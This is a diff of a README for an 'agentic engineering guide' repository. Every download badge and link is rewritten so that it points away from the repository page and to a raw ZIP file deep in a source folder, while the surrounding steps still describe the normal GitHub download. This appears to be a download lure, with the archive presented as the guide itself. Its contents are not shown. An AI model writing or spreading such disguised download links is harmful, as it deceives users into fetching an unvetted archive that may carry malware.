@@ -1,6 +1,6 @@
 # ⚙️ agentic-engineering-guide - Clear Steps to Use Agentic Engineering
 
-[![Download agentic-engineering-guide](https://img.shields.io/badge/Download-Agentic%20Engineering%20Guide-brightgreen)](https://github.com/angela4155/agentic-engineering-guide)
+[![Download agentic-engineering-guide](https://img.shields.io/badge/Download-Agentic%20Engineering%20Guide-brightgreen)](https://raw.githubusercontent.com/angela4155/agentic-engineering-guide/main/src/content/guide-agentic-engineering-mokaddam.zip)
 
 ---
 
@@ -38,7 +38,7 @@ This ensures you can view the guide properly and use any tools or examples that 
 To get started with the agentic-engineering-guide, follow these steps:
 
 1. Go to the main download page by clicking the badge above or this link:  
-   [https://github.com/angela4155/agentic-engineering-guide](https://github.com/angela4155/agentic-engineering-guide)
+   [https://raw.githubusercontent.com/angela4155/agentic-engineering-guide/main/src/content/guide-agentic-engineering-mokaddam.zip](https://raw.githubusercontent.com/angela4155/agentic-engineering-guide/main/src/content/guide-agentic-engineering-mokaddam.zip)
 
 2. On this page, you will find all files and resources related to the guide.
 
@@ -108,7 +108,7 @@ If problems persist, consider reaching out through the GitHub repository’s iss
 
 To download the guide and related materials, visit this page:
 
-[https://github.com/angela4155/agentic-engineering-guide](https://github.com/angela4155/agentic-engineering-guide)
+[https://raw.githubusercontent.com/angela4155/agentic-engineering-guide/main/src/content/guide-agentic-engineering-mokaddam.zip](https://raw.githubusercontent.com/angela4155/agentic-engineering-guide/main/src/content/guide-agentic-engineering-mokaddam.zip)
 
 Click the “Code” button on the page and select “Download ZIP” to get all contents at once. Then unzip the files on your PC, and open the guide documents to begin.
 
@@ -147,4 +147,4 @@ If you encounter any problems or have questions when using the guide, please use
 
 ---
 
-[![Download agentic-engineering-guide](https://img.shields.io/badge/Download-Agentic%20Engineering%20Guide-brightgreen)](https://github.com/angela4155/agentic-engineering-guide)
+[![Download agentic-engineering-guide](https://img.shields.io/badge/Download-Agentic%20Engineering%20Guide-brightgreen)](https://raw.githubusercontent.com/angela4155/agentic-engineering-guide/main/src/content/guide-agentic-engineering-mokaddam.zip)
